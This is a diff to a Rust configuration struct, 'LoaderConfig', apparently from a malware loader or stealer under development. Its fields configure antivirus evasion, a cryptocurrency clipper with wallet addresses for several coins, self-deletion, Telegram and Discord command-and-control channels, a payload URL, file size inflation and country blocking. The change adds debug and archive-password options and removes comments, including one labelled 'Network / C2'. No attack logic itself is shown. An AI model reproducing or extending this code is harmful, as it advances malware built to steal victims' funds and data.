@@ -13,8 +13,8 @@ pub struct LoaderConfig {
     pub evasion_enabled: Option<bool>,
     pub clipper_enabled: Option<bool>,
     pub melt_enabled: Option<bool>,
-    
-    // Crypto
+    pub debug_enabled: Option<bool>,
+
     pub btc_address: Option<String>,
     pub eth_address: Option<String>,
     pub ltc_address: Option<String>,
@@ -25,16 +25,15 @@ pub struct LoaderConfig {
     pub trx_address: Option<String>,
     pub ada_address: Option<String>,
 
-    // Network / C2
     pub telegram_token: Option<String>,
     pub telegram_chat_id: Option<String>,
     pub discord_webhook: Option<String>,
     pub loader_url: Option<String>,
     pub proxy_server: Option<String>,
 
-    // Other
     pub pump_size_mb: Option<u32>,
     pub blocked_countries: Option<HashSet<String>>,
     pub custom_extensions: Option<HashSet<String>>,
     pub custom_keywords: Option<HashSet<String>>,
+    pub archive_password: Option<String>,
 }
